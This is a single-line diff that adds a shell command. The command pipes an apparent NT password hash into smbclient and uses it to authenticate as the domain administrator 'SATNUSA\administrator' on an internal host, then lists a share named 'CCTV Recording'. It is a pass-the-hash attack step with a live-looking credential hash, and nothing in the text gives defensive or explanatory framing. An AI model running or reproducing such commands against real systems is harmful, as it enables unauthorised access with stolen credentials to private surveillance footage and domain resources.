@@ -1,0 +1,1 @@
+printf '70b87fe29b2777310897a77ba7fd5614\n' | smbclient //192.168.88.14/'CCTV Recording' -U 'SATNUSA\administrator' --pw-nt-hash -c 'ls'
